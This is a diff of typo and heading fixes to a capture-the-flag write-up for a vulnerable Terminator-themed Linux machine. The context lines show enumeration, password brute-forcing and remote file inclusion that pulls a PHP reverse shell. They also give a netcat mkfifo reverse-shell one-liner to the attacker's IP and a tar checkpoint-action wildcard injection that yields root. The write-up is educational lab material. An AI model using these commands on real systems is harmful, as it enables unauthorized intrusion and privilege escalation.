@@ -2,9 +2,9 @@
 
 A vulnerable Terminator themed Linux machine.
 
-## External
+# External
 
-Inital `nmap` scan:
+Initial `nmap` scan:
 ```
 $ nmap -sC -sV -oN inital 10.10.146.95 -v
 
@@ -119,11 +119,11 @@ $ nikto -h http://10.10.146.95/
 + 1 host(s) tested
 ```
 
-After both of these scans come back we only get `301` errors which means we are not authorizred to view them so lets move on to another port.
+After both of these scans come back we only get `301` errors which means we are not authorized to view them so lets move on to another port.
 
 **SMB (PORT 445/139)**
 
-Using `smbclient` with the `-L` paramerter we can list the shares that are available on the server.
+Using `smbclient` with the `-L` parameter we can list the shares that are available on the server.
 
 ```
 $ smbclient -L \\\\10.10.146.95\\
@@ -173,7 +173,7 @@ smb: \logs\> ls
   log3.txt                            N        0  Tue Sep 17 21:42:16 2019
 ```
 
-Although there are 3 text fies in here, we see that only 1 has actual contents inside of it, we know this because of the number of bytes displated to the left of the day of the week that the file was created. Using the `get` command we can download the `attention.txt` and `log1.txt` onto our machine.
+Although there are 3 text files in here, we see that only 1 has actual contents inside of it, we know this because of the number of bytes displayed to the left of the day of the week that the file was created. Using the `get` command we can download the `attention.txt` and `log1.txt` onto our machine.
 
 Reading the contents of the files:
 
@@ -197,7 +197,7 @@ terminator219
 
 Reading this file, it looks like a password list to me, we might have to use this in the future.
 
-## Web App
+# Web App
 
 While messing around with the pop3 server, I looked back at my gobuster and nikto scans to see a `squirrelmail` directory, having seen this application before I know it is an email service.
 
@@ -209,7 +209,7 @@ From this page we can go to the login page redirect.
 
 ![q6I1tYK](https://user-images.githubusercontent.com/69171981/119408636-e3564780-bc9a-11eb-9bac-c753d771754d.png)
 
-Now we can use the `log1.txt` to try to bruteforce `miles` password. I decided to use burpsuite's intruder because the wordlist was very short.
+Now we can use the `log1.txt` to try to brute force `miles` password. I decided to use burpsuite's intruder because the wordlist was very short.
 
 ![dJoUqil](https://user-images.githubusercontent.com/69171981/119408680-f36e2700-bc9a-11eb-8658-730046d14094.png)
 
@@ -411,14 +411,14 @@ mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
 </div>  
 ```
 
-As we can see the file contents are embeded into the output, this means that this application is vulnerable. Knowing this we can make use of *<REDACTED> file inclusion* by starting a python http server and having the server get our `php-reverse-shell.php` onto the box.
+As we can see the file contents are embedded into the output, this means that this application is vulnerable. Knowing this we can make use of *<REDACTED> file inclusion* by starting a python http server, `python3 -m http.server`, and having the server get our `php-reverse-shell.php` onto the box.
 
 ```
 $ nc -lnvp 9001
 listening on [any] 9001 ... 
 ```
         
-First set up a netcat listener on your attacking machine.
+First set up a `netcat` listener on your attacking machine.
 
 ```
 http://10.10.146.95/<REDACTED>/administrator/alerts/alertConfigField.php?urlConfig=http://<YOUR IP>:8000/php-reverse-shell.php
@@ -440,9 +440,9 @@ www-data
 
 We are now on the box.
 
-## Internal
+# Internal
 
-First I stablized my shell:
+First I stabilized my shell:
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -469,7 +469,7 @@ drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
 -rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
 ```
 
-Looks like we have access to `milesdyson`'s home directory, inside we see the `user.txt` that we can submit as well as his SMB share. The thing that sticks out to me the most is the folder owned by root with the name `backups`.
+Looks like we have access to `milesdyson`'s home directory, inside we see the `user.txt` that we can submit as well as his smb share. The thing that sticks out to me the most is the folder owned by root with the name `backups`.
 
 ```
 www-data@skynet:/home/milesdyson/backups$ ls -al
@@ -514,14 +514,14 @@ First lets start our netcat listener on our attacking machine
 $ nc -lnvp 9002
 ```
 
-After trying a few different reverse shells I noticed that the netcat one was the only one that worked so lets use that one.
+After trying a few different reverse shells I noticed that the `netcat` one was the only one that worked so lets use that one.
 
 ```
 www-data@skynet:/$ cd /var/www/html
 www-data@skynet:/var/www/html$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh"-i 2>&1|nc <YOUR IP> 9002 >/tmp/f" > shell.sh
 ```
 
-Now that we have created the payloat we need to make the file that will execute it.
+Now that we have created the payload we need to make the file that will execute it.
 
 ```
 www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
@@ -538,7 +538,7 @@ connect to [<YOUR IP>] from (UNKNOWN) [10.10.182.3] 35740
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Now that we are root we can read and sumbit the final flag!
+Now that we are root we can read and submit the final flag!
 
 ```
 # cd /root
@@ -556,4 +556,4 @@ drwxr-xr-x  2 root root 4096 Sep 17  2019 .nano
 <REDACTED>
 ```
 
-Thank you for joining me on my first offical write-up, I hope to make many more in the future :) 
+Thank you for joining me on my first write-up, I hope to make many more in the future :) 
